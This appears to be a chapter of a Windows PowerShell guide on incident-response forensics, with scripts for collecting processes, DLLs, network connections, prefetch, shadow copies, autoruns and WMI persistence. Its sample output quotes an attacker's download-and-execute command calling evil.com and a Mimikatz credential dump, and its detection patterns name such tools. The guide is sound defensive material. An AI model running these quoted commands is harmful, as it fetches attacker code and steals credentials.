# 20 — Forensics and Memory Analysis

> **Run as:** Local Administrator. Most forensic collection commands require elevated privileges.  
> **Philosophy:** Collect volatile data first (memory, processes, network), then move to disk artifacts. Never write forensic output to the evidence drive.

---

## ⚡ Quick Reference

| Collection Target | What You Capture |
|-------------------|-----------------|
| [Running Processes + Parent PIDs](#1-collecting-running-processes-with-parent-pids) | Full process tree with command lines |
| [Loaded DLLs](#2-enumerating-loaded-dlls) | DLLs loaded per process |
| [Network Connections + Process Mapping](#3-network-connections-with-process-mapping) | Active TCP/UDP mapped to owning processes |
| [ARP / Routing / DNS Cache](#4-arp-routing-and-dns-cache) | Network artifact snapshot |
| [Scheduled Tasks](#5-scheduled-tasks-full-detail) | Persistence via task scheduler |
| [Service Binary Paths](#6-service-binary-paths) | Hijacked or suspicious service executables |
| [Process Hollowing Detection](#7-detecting-process-hollowing) | Legitimate process names running from wrong paths |
| [Prefetch Analysis](#8-prefetch-analysis) | Evidence of past program execution |
| [USN Journal](#9-usn-journal-queries) | File system change history |
| [VSS Shadow Copies](#10-vss-shadow-copy-management) | Previous file versions for recovery or timeline |
| [PowerShell History](#11-powershell-history-file-collection) | Attacker command history |
| [AmCache / ShimCache](#12-amcache-and-shimcache) | Application execution artifacts |
| [Autorun Locations](#13-all-autorun-locations) | Comprehensive persistence check |
| [WMI Persistence](#14-wmi-persistence-artifact-collection) | WMI-based backdoors |

---

## 1. Collecting Running Processes with Parent PIDs

### What you're looking for
Full process tree showing every running process, its parent, command line, and executable path. Abnormal parent-child relationships (e.g., `winword.exe` spawning `cmd.exe`) reveal attacker activity.

### Collection Script
```powershell
Get-CimInstance Win32_Process |
    Select-Object ProcessId, ParentProcessId, Name,
        @{n='Path';e={$_.ExecutablePath}},
        @{n='CommandLine';e={$_.CommandLine}},
        @{n='Owner';e={ (Invoke-CimMethod -InputObject $_ -MethodName GetOwner).User }},
        @{n='Created';e={$_.CreationDate}} |
    Sort-Object ParentProcessId, ProcessId |
    Export-Csv -Path E:\forensics\processes.csv -NoTypeInformation
```

### Sample Output
```
ProcessId  ParentProcessId  Name              Path                              CommandLine
---------  ---------------  ----              ----                              -----------
4          0                System
1204       672              svchost.exe       C:\Windows\System32\svchost.exe   svchost.exe -k netsvcs
3456       1204             powershell.exe    C:\Windows\System32\...           powershell.exe -enc JABjAD...
```

### Tips & Warnings
> ⚠️ `powershell.exe` spawned by `svchost.exe` with `-enc` is highly suspicious — decode the Base64 immediately.

> 💡 Always write forensic output to an **external drive** (E:\ or network share), never to the suspect system's C:\ drive.

---

## 2. Enumerating Loaded DLLs

### What you're looking for
DLLs loaded by each process. Attackers inject malicious DLLs into legitimate processes (DLL injection/sideloading).

### Collection Script
```powershell
Get-Process | ForEach-Object {
    $proc = $_
    try {
        $_.Modules | ForEach-Object {
            [PSCustomObject]@{
                Process   = $proc.ProcessName
                PID       = $proc.Id
                DLL       = $_.ModuleName
                Path      = $_.FileName
                Size      = $_.ModuleMemorySize
            }
        }
    } catch {}
} | Where-Object { $_.Path -notlike "C:\Windows\*" -and $_.Path -ne $null } |
    Export-Csv E:\forensics\non_system_dlls.csv -NoTypeInformation
```

### Sample Output
```
Process        PID   DLL              Path                                    Size
-------        ---   ---              ----                                    ----
explorer       3200  malware.dll      C:\Users\jsmith\AppData\Local\Temp\...  65536
svchost        1204  hook.dll         C:\ProgramData\evil\hook.dll            32768
```

### Tips & Warnings
> ⚠️ DLLs loaded from `%TEMP%`, `%APPDATA%`, or `ProgramData` by system processes are highly suspicious.

---

## 3. Network Connections with Process Mapping

### What you're looking for
All active network connections mapped to their owning process — reveals C2 channels and lateral movement.

### Collection Script
```powershell
Get-NetTCPConnection -State Established, Listen |
    Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State,
        OwningProcess,
        @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).ProcessName}} |
    Sort-Object Process |
    Export-Csv E:\forensics\network_connections.csv -NoTypeInformation
```

### Sample Output
```
LocalAddress  LocalPort  RemoteAddress   RemotePort  State        OwningProcess  Process
------------  ---------  -------------   ----------  -----        -------------  -------
10.0.0.50     49721      185.220.101.5   443         Established  3456           powershell
10.0.0.50     139        10.0.0.100      52341       Established  4              System
```

### Tips & Warnings
> ⚠️ `powershell.exe` with an established connection to an external IP is a top C2 indicator.

---

## 4. ARP, Routing, and DNS Cache

### What you're looking for
Network artifacts that reveal lateral movement targets, DNS resolutions to C2 domains, and ARP spoofing.

### Collection Script
```powershell
# ARP table
Get-NetNeighbor | Select-Object IPAddress, LinkLayerAddress, State, InterfaceAlias |
    Export-Csv E:\forensics\arp_table.csv -NoTypeInformation

# Routing table
Get-NetRoute | Select-Object DestinationPrefix, NextHop, RouteMetric, InterfaceAlias |
    Export-Csv E:\forensics\routing_table.csv -NoTypeInformation

# DNS cache
Get-DnsClientCache | Select-Object Entry, RecordName, RecordType, Data, TimeToLive |
    Export-Csv E:\forensics\dns_cache.csv -NoTypeInformation
```

### Sample Output (DNS Cache)
```
Entry                   RecordName             RecordType  Data             TimeToLive
-----                   ----------             ----------  ----             ----------
evil-c2.example.com     evil-c2.example.com    A           185.220.101.5    3200
update.microsoft.com    update.microsoft.com   A           13.107.4.52      1800
```

### Tips & Warnings
> ⚠️ Cross-reference DNS cache entries with known C2 domains and threat intel feeds.

---

## 5. Scheduled Tasks Full Detail

### What you're looking for
Complete scheduled task details for persistence analysis — including actions, triggers, and run-as accounts.

### Collection Script
```powershell
Get-ScheduledTask | ForEach-Object {
    $info = Get-ScheduledTaskInfo -TaskName $_.TaskName -TaskPath $_.TaskPath -ErrorAction SilentlyContinue
    [PSCustomObject]@{
        Name      = $_.TaskName
        Path      = $_.TaskPath
        State     = $_.State
        RunAs     = $_.Principal.UserId
        Actions   = ($_.Actions | ForEach-Object { "$($_.Execute) $($_.Arguments)" }) -join ' | '
        Triggers  = ($_.Triggers | ForEach-Object { $_.CimClass.CimClassName }) -join ', '
        LastRun   = $info.LastRunTime
        NextRun   = $info.NextRunTime
    }
} | Export-Csv E:\forensics\scheduled_tasks.csv -NoTypeInformation
```

### Tips & Warnings
> 💡 Focus on tasks not under `\Microsoft\Windows\*` and those running as SYSTEM with user-writable paths.

---

## 6. Service Binary Paths

### What you're looking for
Services pointing to non-standard binary paths — attackers replace service executables or create new services for persistence.

### Collection Script
```powershell
Get-CimInstance Win32_Service |
    Select-Object Name, DisplayName, State, StartMode, PathName,
        @{n='StartName';e={$_.StartName}} |
    Where-Object { $_.PathName -notlike "*\Windows\*" -and $_.PathName -ne $null } |
    Sort-Object State -Descending |
    Export-Csv E:\forensics\services.csv -NoTypeInformation
```

### Sample Output
```
Name         DisplayName        State    StartMode  PathName                           StartName
----         -----------        -----    ---------  --------                           ---------
EvilSvc      System Helper      Running  Auto       C:\ProgramData\svc\helper.exe      LocalSystem
LegitApp     Legit Application  Running  Auto       C:\Program Files\App\legit.exe     NT AUTHORITY\SYSTEM
```

### Tips & Warnings
> ⚠️ Services running as `LocalSystem` from non-Program Files paths deserve investigation.

---

## 7. Detecting Process Hollowing

### What you're looking for
Process hollowing is when an attacker starts a legitimate process (e.g., `svchost.exe`), hollows out its memory, and replaces it with malicious code. The process name looks normal but runs from the wrong path or has an unexpected parent.

### Detection Script
```powershell
$expectedPaths = @{
    'svchost.exe'    = 'C:\Windows\System32\svchost.exe'
    'lsass.exe'      = 'C:\Windows\System32\lsass.exe'
    'csrss.exe'      = 'C:\Windows\System32\csrss.exe'
    'services.exe'   = 'C:\Windows\System32\services.exe'
    'smss.exe'       = 'C:\Windows\System32\smss.exe'
    'wininit.exe'    = 'C:\Windows\System32\wininit.exe'
}

Get-CimInstance Win32_Process |
    Where-Object { $expectedPaths.ContainsKey($_.Name) } |
    ForEach-Object {
        $expected = $expectedPaths[$_.Name]
        if ($_.ExecutablePath -and $_.ExecutablePath -ne $expected) {
            [PSCustomObject]@{
                Name         = $_.Name
                PID          = $_.ProcessId
                ExpectedPath = $expected
                ActualPath   = $_.ExecutablePath
                CommandLine  = $_.CommandLine
                Alert        = "PATH MISMATCH"
            }
        }
    } | Format-Table -AutoSize -Wrap
```

### Tips & Warnings
> ⚠️ A path mismatch for `svchost.exe`, `lsass.exe`, or `csrss.exe` is a critical indicator of compromise.

---

## 8. Prefetch Analysis

### What you're looking for
Prefetch files record evidence of program execution — even after the program is deleted. Located in `C:\Windows\Prefetch\`.

### Collection Script
```powershell
$prefetchPath = "$env:SystemRoot\Prefetch"
Get-ChildItem $prefetchPath -Filter "*.pf" |
    Select-Object Name,
        @{n='LastRun';e={$_.LastWriteTime}},
        @{n='Created';e={$_.CreationTime}},
        @{n='SizeKB';e={[math]::Round($_.Length/1KB,1)}} |
    Sort-Object LastRun -Descending |
    Export-Csv E:\forensics\prefetch.csv -NoTypeInformation
```

### Sample Output
```
Name                           LastRun                  Created                  SizeKB
----                           -------                  -------                  ------
MIMIKATZ.EXE-AB12CD34.pf      3/28/2026 3:14:22 PM     3/28/2026 3:14:22 PM     12.5
POWERSHELL.EXE-1A2B3C4D.pf    3/29/2026 8:00:00 AM     2025-01-15 10:00:00 AM   45.2
```

### Tips & Warnings
> ⚠️ Prefetch files for known attack tools (mimikatz, psexec, procdump) are strong evidence of compromise.

> 💡 Prefetch must be enabled (it is by default on workstations but disabled on servers).

---

## 9. USN Journal Queries

### What you're looking for
The USN (Update Sequence Number) journal tracks all file system changes. It reveals file creation, deletion, and renaming — even for files that have been cleaned up.

### Collection Script
```powershell
# Query USN journal via fsutil (wrapped in PS)
$output = & fsutil usn readjournal C: csv | ConvertFrom-Csv
$output | Where-Object {
    $_.FileName -match 'mimikatz|psexec|procdump|beacon|cobalt|payload|ransom' -or
    $_.FileName -match '\.exe$|\.dll$|\.ps1$|\.bat$'
} | Select-Object Timestamp, FileName, Reason |
    Sort-Object Timestamp -Descending |
    Select-Object -First 100 |
    Export-Csv E:\forensics\usn_journal.csv -NoTypeInformation
```

### Tips & Warnings
> 💡 USN journal can grow very large. Filter by time range and file patterns for practical analysis.

---

## 10. VSS Shadow Copy Management

### What you're looking for
Volume Shadow Copies provide point-in-time snapshots. Useful for recovering deleted files or comparing pre/post-compromise states. Attackers often delete them (ransomware).

### Collection Script
```powershell
# List shadow copies
Get-CimInstance Win32_ShadowCopy | Select-Object ID, InstallDate, VolumeName,
    @{n='SizeMB';e={[math]::Round($_.Count/1MB,1)}} | Format-Table -AutoSize

# Mount a shadow copy for analysis
$shadow = (Get-CimInstance Win32_ShadowCopy | Sort-Object InstallDate -Descending | Select-Object -First 1)
$shadowPath = $shadow.DeviceObject + "\"
cmd /c mklink /d C:\ShadowMount "$shadowPath"
# Browse: dir C:\ShadowMount
```

### Tips & Warnings
> ⚠️ If there are NO shadow copies on a system that should have them, ransomware may have deleted them. Check event ID 524 in System log.

---

## 11. PowerShell History File Collection

### What you're looking for
PowerShell's `PSReadLine` module saves command history to a plaintext file. Attackers often forget to clear it.

### Collection Script
```powershell
$users = Get-ChildItem C:\Users -Directory
foreach ($user in $users) {
    $histFile = Join-Path $user.FullName "AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $histFile) {
        Write-Host "=== History for $($user.Name) ===" -ForegroundColor Yellow
        $content = Get-Content $histFile
        Write-Host "  Lines: $($content.Count)"
        # Look for suspicious commands
        $suspicious = $content | Where-Object { $_ -match 'Invoke-Mimikatz|Invoke-WebRequest|DownloadString|Net\.WebClient|IEX|bypass|encodedcommand' }
        if ($suspicious) {
            Write-Host "  [ALERT] Suspicious commands found:" -ForegroundColor Red
            $suspicious | ForEach-Object { Write-Host "    $_" }
        }
        Copy-Item $histFile "E:\forensics\history_$($user.Name).txt"
    }
}
```

### Sample Output
```
=== History for jsmith ===
  Lines: 234
  [ALERT] Suspicious commands found:
    IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
    Invoke-Mimikatz -DumpCreds
```

### Tips & Warnings
> ⚠️ PowerShell history is gold for forensics — always collect it early before attackers clear it.

---

## 12. AmCache and ShimCache

### What you're looking for
AmCache (`Amcache.hve`) and ShimCache (`AppCompatCache`) record evidence of program execution including timestamps and file paths — even after the executable is deleted.

### Collection Script
```powershell
# ShimCache via registry
$shimPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache"
$shimData = (Get-ItemProperty $shimPath).AppCompatCache
# Export raw binary for offline analysis
[System.IO.File]::WriteAllBytes("E:\forensics\shimcache_raw.bin", $shimData)

# AmCache — copy the hive file (locked while system runs)
$amcachePath = "$env:SystemRoot\AppCompat\Programs\Amcache.hve"
# Use Volume Shadow Copy to access locked file
$shadow = (Get-CimInstance Win32_ShadowCopy | Sort-Object InstallDate -Descending | Select-Object -First 1)
if ($shadow) {
    Copy-Item "$($shadow.DeviceObject)\Windows\AppCompat\Programs\Amcache.hve" "E:\forensics\Amcache.hve"
    Write-Host "AmCache hive collected successfully"
}
```

### Tips & Warnings
> 💡 Use tools like `AmcacheParser.exe` (Eric Zimmerman) to parse the hive into readable CSV format.

---

## 13. All Autorun Locations

### What you're looking for
Comprehensive check of all persistence mechanisms — registry, startup folders, scheduled tasks, services, and more.

### Collection Script
```powershell
$autoruns = @()

# Registry Run keys
$runKeys = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
)
foreach ($key in $runKeys) {
    if (Test-Path $key) {
        $props = Get-ItemProperty $key -ErrorAction SilentlyContinue
        $props.PSObject.Properties | Where-Object { $_.Name -notlike 'PS*' } | ForEach-Object {
            $autoruns += [PSCustomObject]@{ Location=$key; Name=$_.Name; Value=$_.Value; Type="Registry" }
        }
    }
}

# Startup folders
$startupPaths = @(
    "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup",
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
)
foreach ($path in $startupPaths) {
    Get-ChildItem $path -ErrorAction SilentlyContinue | ForEach-Object {
        $autoruns += [PSCustomObject]@{ Location=$path; Name=$_.Name; Value=$_.FullName; Type="Startup Folder" }
    }
}

$autoruns | Export-Csv E:\forensics\autoruns.csv -NoTypeInformation
$autoruns | Format-Table -AutoSize
```

### Tips & Warnings
> 💡 For the most thorough autorun analysis, use `Autoruns` from Sysinternals — but this script covers the critical locations.

---

## 14. WMI Persistence Artifact Collection

### What you're looking for
WMI event subscriptions are a stealthy persistence mechanism — an event filter triggers an event consumer that runs attacker code.

### Collection Script
```powershell
Write-Host "=== WMI Event Filters ===" -ForegroundColor Yellow
Get-CimInstance -Namespace root\subscription -ClassName __EventFilter |
    Select-Object Name, Query, QueryLanguage | Format-Table -AutoSize -Wrap

Write-Host "=== WMI Event Consumers ===" -ForegroundColor Yellow
Get-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer -ErrorAction SilentlyContinue |
    Select-Object Name, CommandLineTemplate | Format-Table -AutoSize -Wrap
Get-CimInstance -Namespace root\subscription -ClassName ActiveScriptEventConsumer -ErrorAction SilentlyContinue |
    Select-Object Name, ScriptText | Format-Table -AutoSize -Wrap

Write-Host "=== Filter-to-Consumer Bindings ===" -ForegroundColor Yellow
Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding |
    Select-Object @{n='Filter';e={$_.Filter.Name}}, @{n='Consumer';e={$_.Consumer.Name}} |
    Format-Table -AutoSize
```

### Sample Output
```
=== WMI Event Filters ===
Name              Query                                                    QueryLanguage
----              -----                                                    -------------
EvilFilter        SELECT * FROM __InstanceModificationEvent WITHIN 60...   WQL

=== WMI Event Consumers ===
Name              CommandLineTemplate
----              -------------------
EvilConsumer      powershell.exe -enc JABjAGwA...

=== Filter-to-Consumer Bindings ===
Filter        Consumer
------        --------
EvilFilter    EvilConsumer
```

### Tips & Warnings
> ⚠️ Any WMI `CommandLineEventConsumer` or `ActiveScriptEventConsumer` is suspicious — legitimate use is rare.

> 💡 Remove malicious WMI persistence:
> ```powershell
> Get-CimInstance -Namespace root\subscription -ClassName __EventFilter -Filter "Name='EvilFilter'" | Remove-CimInstance
> Get-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer -Filter "Name='EvilConsumer'" | Remove-CimInstance
> ```

---

## Navigation

| ← Previous | Home | Next → |
|-----------|------|--------|
| [19 — Zero Trust and MS Graph](19-Zero-Trust-and-MS-Graph.md) | [README](../README.md) | [21 — Kerberos and Authentication](21-Kerberos-and-Authentication.md) |
